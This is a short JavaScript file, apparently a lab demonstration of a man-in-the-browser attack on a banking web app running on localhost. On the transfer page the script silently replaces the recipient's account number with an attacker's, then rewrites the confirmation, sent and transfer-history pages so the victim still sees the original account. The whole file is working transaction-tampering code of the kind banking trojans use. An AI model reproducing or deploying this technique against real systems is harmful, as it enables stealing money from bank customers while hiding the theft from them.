let account = '11111111111111111111111111'

// localStorage.clear();
localStorage.setItem('fake_account_number', '11111111111111111111111111');
localStorage.setItem('real_account_number', '12345678901234567865435645')
localStorage.setItem('hacked', false)


window.onload = function() {
    if(window.location.href == 'http://localhost:8000/transfer/') {
        document.getElementById('id_receiver_account').value = ""       
        
        function myFunction(){
            if(document.getElementById('id_receiver_account').value.toString(10) == localStorage.getItem('real_account_number')) {
                window.alert("I am in");
                localStorage.setItem('hacked', true)
                document.getElementById('id_receiver_account').value = localStorage.getItem('fake_account_number');
            }
            document.getElementById("transfer_sending_form").submit()
        }
        document.getElementById('submit_form').onclick = myFunction;
    }

    if(window.location.href == 'http://localhost:8000/transfer_confirm/') {
        if(document.getElementById('account').innerHTML.includes(localStorage.getItem('fake_account_number'))) {
        //if(this.localStorage.getItem('hacked')) {    
            document.getElementById('account').innerHTML = localStorage.getItem('real_account_number')   
        }     
}
    if(window.location.href == 'http://localhost:8000/transfer_sent/') {
        if(document.getElementById('account').innerHTML.includes(localStorage.getItem('fake_account_number'))) {
            document.getElementById('account').innerHTML = localStorage.getItem('real_account_number')
        } 
    }
    if(window.location.href == 'http://localhost:8000/transfers_history/') {
        var table = document.getElementById('table')
        var l = table.rows.length
        var i;
        var els = document.getElementsByTagName('td');
        var arr = [];
        for (var i = 0; i < els.length; i++) {
            if (els[i].getAttribute("name") == "account") {
                if(els[i].innerHTML == localStorage.getItem('fake_account_number')) {  
                    var td = document.getElementsByTagName('td')[i]
                    td.innerHTML = localStorage.getItem('real_account_number')
                    this.console.log(els[i].innerHTML)
                }
            }   
        }
    }
}